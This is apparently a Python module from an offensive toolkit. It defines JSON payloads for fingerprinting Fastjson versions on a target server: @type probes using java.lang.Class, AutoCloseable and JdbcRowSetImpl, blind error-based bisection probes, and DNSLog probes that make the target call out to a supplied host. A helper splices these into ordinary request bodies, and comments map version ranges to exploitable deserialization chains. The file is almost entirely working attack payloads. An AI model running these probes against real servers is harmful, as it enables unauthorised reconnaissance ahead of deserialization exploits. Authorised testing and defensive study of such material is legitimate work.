"""Payloads for Fastjson version fingerprinting.

References:
- https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA （浅蓝 DNS / 精确回显）
- 盲判断：无报错回显时用 Exception / AutoCloseable / Class+Jdbc / Jdbc 布尔二分

Note checklist implemented here:
1. AutoType: Class vs Random.String
2. SafeMode: java.lang.String + 多余引号畸形；开启时报错
3. AutoCloseable exact: incomplete JSON → fastjson-version（1.2.76+ 常写死 1.2.76）
4. 1.2.83: Test.TestException 不报错
5. DNSLog: <=1.2.47 / <=1.2.68 / 双 DNS 分 <=1.2.80 vs 1.2.83
6. 不出网：Exception / AutoCloseable / Class+Jdbc / Jdbc 报错二分
   （生产常仅 500 / 裸 error；无法再分 1.2.70-72 与 1.2.73-80）
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Optional

_DNS_HOST_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?$")


@dataclass(frozen=True)
class VersionProbe:
    id: str
    category: str
    description: str
    payload: str
    dns_related: bool = False
    dns_tags: tuple[str, ...] = ()


def validate_dns_host(host: str) -> str:
    host = host.strip().rstrip(".")
    if not host or not _DNS_HOST_RE.match(host) or ".." in host:
        raise ValueError(f"非法 DNSLog 主机名: {host!r}")
    return host


# --- 0. 对照：正常 JSON vs 残缺 JSON（建立「报错」指纹）---
BASELINE_OK = VersionProbe(
    id="baseline_ok",
    category="control",
    description="合法 JSON；用于对比生产环境 500 / 裸 error 侧信道",
    payload='{"x":1}',
)

NEGATIVE_CONTROL = VersionProbe(
    id="negative_control",
    category="control",
    description="残缺 JSON；与 baseline 对比，建立报错指纹；若无差异则 offline「不报错」不可信",
    payload='{"@type":',
)

# --- 1. AutoType 开启探测 ---
AUTOTYPE_CLASS = VersionProbe(
    id="autotype_class",
    category="autotype",
    description='java.lang.Class + empty val；AutoType 开启时报 "autoType is not support. java.lang.Class"',
    payload='{"xxx":{"@type":"java.lang.Class","val":""}}',
)

AUTOTYPE_RANDOM = VersionProbe(
    id="autotype_random",
    category="autotype",
    description="Random.String；AutoType 关闭时报 autoType is not support. Random.String",
    payload='{"xxx":{"@type":"Random.String"}}',
)

# --- 2. SafeMode 探测 ---
SAFEMODE_STRING = VersionProbe(
    id="safemode_string",
    category="safemode",
    description=(
        "java.lang.String + 多余引号畸形；SafeMode 开启时报错。"
        "仅适用于有报错回显；报错≠必然 SafeMode（须交叉校验）"
    ),
    payload='{"zero":{"@type":"java.lang.String"""}}}',
)

# --- 3. AutoCloseable 精确版本（响应含 fastjson-version）---
AUTOCLOSEABLE_EXACT = VersionProbe(
    id="autoclosable_exact",
    category="exact",
    description="残缺 AutoCloseable JSON，期望回显 fastjson-version",
    payload='{"@type":"java.lang.AutoCloseable"',
)

# --- 4. 1.2.83 具体探测 ---
PROBE_1_2_83 = VersionProbe(
    id="probe_1_2_83",
    category="exact",
    description="Test.TestException：仅 1.2.83 通常不报错",
    payload='{"xxx":{"@type":"Test.TestException"}}',
)

# --- 6. 不出网二分探测（可插入业务 JSON 的多余键；双 @type 勿经标准 JSON 库重序列化）---
# 利用区间对照：<1.2.24 无限制；24-47 Class；48-68 AutoCloseable；
# 70-72 无链；73-80 Exception；83 无漏洞。本表无法区分 70 与 73。
OFFLINE_EXCEPTION = VersionProbe(
    id="offline_exception",
    category="offline",
    description="不报错≈1.2.83/1.2.24；报错≈1.2.25-1.2.80",
    payload='{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}',
)

OFFLINE_AUTOCLOSEABLE = VersionProbe(
    id="offline_autoclosable",
    category="offline",
    description="不报错≈1.2.24-1.2.68；报错≈1.2.70-1.2.83",
    payload='{"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}',
)

OFFLINE_CLASS_JDBC = VersionProbe(
    id="offline_class_jdbc",
    category="offline",
    description="不报错≈1.2.24-1.2.47；报错≈1.2.48-1.2.83",
    payload=(
        '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},'
        '"b":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}'
    ),
)

OFFLINE_JDBC = VersionProbe(
    id="offline_jdbc",
    category="offline",
    description="不报错≈1.2.24；报错≈1.2.25-1.2.83",
    payload='{"zero":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}',
)

OFFLINE_PROBES: tuple[VersionProbe, ...] = (
    OFFLINE_EXCEPTION,
    OFFLINE_AUTOCLOSEABLE,
    OFFLINE_CLASS_JDBC,
    OFFLINE_JDBC,
)


def build_dns_version_probes(hosts: dict[str, str]) -> list[VersionProbe]:
    """Build DNS version probes.

    hosts keys: le47, le68, d80a, d80b
    """
    le47 = validate_dns_host(hosts["le47"])
    le68 = validate_dns_host(hosts["le68"])
    d80a = validate_dns_host(hosts["d80a"])
    d80b = validate_dns_host(hosts["d80b"])
    return [
        VersionProbe(
            id="dns_le_1_2_47",
            category="dns",
            description="DNS：命中则大致 <=1.2.47",
            payload=(
                '[{"@type":"java.lang.Class","val":"java.io.ByteArrayOutputStream"},'
                '{"@type":"java.io.ByteArrayOutputStream"},'
                f'{{"@type":"java.net.InetSocketAddress"{{"address":,"val":"{le47}"}}}}]'
            ),
            dns_related=True,
            dns_tags=("le47",),
        ),
        VersionProbe(
            id="dns_le_1_2_68",
            category="dns",
            description="DNS：命中则大致 <=1.2.68",
            payload=(
                '[{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"},'
                '{"@type":"java.io.ByteArrayOutputStream"},'
                f'{{"@type":"java.net.InetSocketAddress"{{"address":,"val":"{le68}"}}}}]'
            ),
            dns_related=True,
            dns_tags=("le68",),
        ),
        VersionProbe(
            id="dns_1_2_80_83",
            category="dns",
            description="DNS：仅 d80a≈1.2.80；d80a+d80b≈1.2.83",
            payload=(
                '[{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException",'
                f'"x":{{"@type":"java.net.InetSocketAddress"{{"address":,"val":"{d80a}"}}}}}},'
                '{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException",'
                f'"message":{{"@type":"java.net.InetSocketAddress"{{"address":,"val":"{d80b}"}}}}}}]'
            ),
            dns_related=True,
            dns_tags=("d80a", "d80b"),
        ),
    ]


def inject_probe_into_object(base_object_json: str, probe_object_json: str) -> str:
    """Merge probe object keys into a base JSON object as raw text.

    Fastjson tolerates unrelated keys; dual ``@type`` payloads are intentionally
    invalid for stdlib ``json`` and must stay literal.
    """
    base = base_object_json.strip()
    probe = probe_object_json.strip()
    if not (base.startswith("{") and base.endswith("}")):
        raise ValueError("base_object_json 须为 JSON 对象")
    if not (probe.startswith("{") and probe.endswith("}")):
        raise ValueError("probe_object_json 须为 JSON 对象")
    base_inner = base[1:-1].strip()
    probe_inner = probe[1:-1].strip()
    if not probe_inner:
        return base
    if not base_inner:
        return probe
    return "{" + base_inner + "," + probe_inner + "}"


def offline_probes() -> list[VersionProbe]:
    return [
        BASELINE_OK,
        NEGATIVE_CONTROL,
        AUTOTYPE_CLASS,
        AUTOTYPE_RANDOM,
        SAFEMODE_STRING,
        AUTOCLOSEABLE_EXACT,
        PROBE_1_2_83,
        *OFFLINE_PROBES,
    ]


def all_version_probes(dns_hosts: Optional[dict[str, str]] = None) -> list[VersionProbe]:
    probes = offline_probes()
    if dns_hosts:
        probes.extend(build_dns_version_probes(dns_hosts))
    return probes
